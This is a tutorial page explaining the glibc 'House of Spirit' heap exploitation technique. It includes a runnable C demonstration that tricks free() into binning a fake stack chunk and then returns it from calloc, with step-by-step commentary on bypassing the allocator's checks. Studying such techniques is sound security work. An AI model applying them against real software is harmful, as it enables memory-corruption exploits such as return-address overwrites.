#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Spirit",
    description: "An attack that tricks free() into adding a non-heap pointer (e.g., a stack address) to a fastbin, leading to an arbitrary allocation.",
    date: "2025-12-13",
    order: 29,
  ),
)<frontmatter>

= glibc Allocator: House of Spirit

== Introduction

The "House of Spirit" is a heap exploitation technique where an attacker crafts a fake chunk in a controlled memory region (like the stack or .bss) and tricks the allocator into `free()`-ing it. This places the attacker-controlled memory region into a bin (typically a fastbin), from which it can be allocated by a subsequent `malloc` call. The result is a `malloc` call that returns a pointer to a location the attacker already controls, enabling trivial overwrites of critical data like saved return addresses.

The required primitives are:
1. The address of the target memory region must be known.
2. The attacker must have the ability to write to this memory region to craft the fake chunk.

== Prerequisites
- *Known Target Address*: The attacker needs to know the address of the memory region they want to allocate (e.g., via a stack leak).
- *Write Primitive*: Ability to write data to the target memory region to create a fake chunk header (specifically the `size` field and the `size` of the *next* chunk).
- *Free Primitive*: Ability to pass the pointer of the fake chunk to `free()`.
- *T-cache Exhaustion*: On modern glibc, the t-cache for the target size must be full so that the `free()` places the chunk into the fastbin.

== Example from `house_of_spirit.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	puts("This file demonstrates the house of spirit attack.");
	puts("This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write.");
	puts("Required primitives: known target address, ability to set up the start/end of the target memory");

	puts("\nStep 1: Allocate 7 chunks and free them to fill up tcache");
	void *chunks[7];
	for(int i=0; i<7; i++) {
		chunks[i] = malloc(0x30);
	}
	for(int i=0; i<7; i++) {
		free(chunks[i]);
	}

	puts("\nStep 2: Prepare the fake chunk");
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	long fake_chunks[10] __attribute__ ((aligned (0x10)));
	printf("The target fake chunk is at %p\n", fake_chunks);
	printf("It contains two chunks. The first starts at %p and the second at %p.\n", &fake_chunks[1], &fake_chunks[9]);
	printf("This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	puts("... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.");
	printf("Now set the size of the chunk (%p) to 0x40 so malloc will think it is a valid chunk.\n", &fake_chunks[1]);
	fake_chunks[1] = 0x40; // this is the size

	printf("The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
	printf("Set the size of the chunk (%p) to 0x1234 so freeing the first chunk can succeed.\n", &fake_chunks[9]);
	fake_chunks[9] = 0x1234; // nextsize

	puts("\nStep 3: Free the first fake chunk");
	puts("Note that the address of the fake chunk must be 16-byte aligned.\n");
	void *victim = &fake_chunks[2];
	free(victim);

	puts("\nStep 4: Take out the fake chunk");
	puts("First we have to empty the tcache.");
	for(int i=0; i<7; i++) {
		malloc(0x30);
	}

	printf("Now the next calloc (or malloc) will return our fake chunk at %p!\n", &fake_chunks[2]);
	void *allocated = calloc(1, 0x30);
	printf("malloc(0x30): %p, fake chunk: %p\n", allocated, victim);

	assert(allocated == victim);
}
```

== Attack Flow Explained

=== 1. Prepare the Bins

For this attack to work on a fastbin, we must bypass the t-cache. We do this by completely filling the t-cache bin for the size we intend to use (`0x40`).

```c
for(int i=0; i<7; i++) {
	chunks[i] = malloc(0x30); // Allocates a 0x40-sized chunk
}
for(int i=0; i<7; i++) {
	free(chunks[i]);
}
```
Now, the t-cache bin for size `0x40` is full. Any subsequent `free()` of a `0x40` chunk will cause it to be placed in the corresponding fastbin.

=== 2. Craft the Fake Chunk

The core of the attack is creating a fake chunk structure in a controlled memory region (in this case, the `fake_chunks` array on the stack). For `free()` to accept this chunk, it must pass a few integrity checks.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Array Index*], [*Stack Address*], [*Content*], [*Note*],
    [`fake_chunks[0]`], `...`, `...`, [Previous chunk's data],
    [*`fake_chunks[1]`*], `...`, [`0x40`], [Fake chunk *size* field. Must be a valid fastbin size.],
    [*`fake_chunks[2]`*], `...`, `...`, [Start of user data. `victim` points here.],
    [`...`], `...`, `...`, `...`,
    [*`fake_chunks[9]`*], `...`, [`0x1234`], [Size of the *next* chunk. Must be a sane value to pass checks.],
  ),
  caption: [Layout of the fake chunk on the stack. The pointer passed to `free` points *after* the size field.],
)

- We set `fake_chunks[1]` to `0x40`. This serves as the `size` field of our fake chunk. The pointer we will `free()` is `&fake_chunks[2]`, so the allocator will look at the memory address just before it (`&fake_chunks[1]`) to find the size.
- We set `fake_chunks[9]` to `0x1234`. When `free()` is called on a fastbin-sized chunk, it performs a check on the *next* chunk's size to prevent certain types of corruption. `0x1234` is a "sane" size that will pass this check.

=== 3. Freeing the Fake Chunk

With the t-cache full and the fake chunk crafted, we can now call `free()` on our `victim` pointer.

```c
void *victim = &fake_chunks[2];
free(victim);
```
The allocator checks the t-cache, finds it full, and proceeds to the fastbin logic. Our fake chunk passes the necessary checks and is added to the head of the `0x40` fastbin.

#figure(
  table(
    columns: (auto, auto),
    inset: 10pt,
    align: center,
    [*Bin*], [*State*],
    [Fastbin (0x40)], "[ `victim` (our fake chunk) ]",
  ),
  caption: [The fastbin now contains a pointer to our fake chunk on the stack.],
)


=== 4. Allocating the Fake Chunk

The final step is to retrieve the pointer from `malloc`. First, we must empty the t-cache so that `malloc` will look in the fastbin.

```c
// Empty the tcache
for(int i=0; i<7; i++) {
	malloc(0x30);
}

// Allocate from the fastbin
void *allocated = calloc(1, 0x30);
```

The `malloc` call requests a `0x30`-byte chunk (which rounds up to a `0x40` internal size), finds the t-cache empty, and pulls the next available chunk from the fastbin—which is our fake chunk. The `assert(allocated == victim)` passes, confirming that we have received a `malloc`-returned pointer that points directly to our controlled stack memory. An attacker can now use this pointer to overwrite saved function parameters, return addresses, or anything else on the stack.

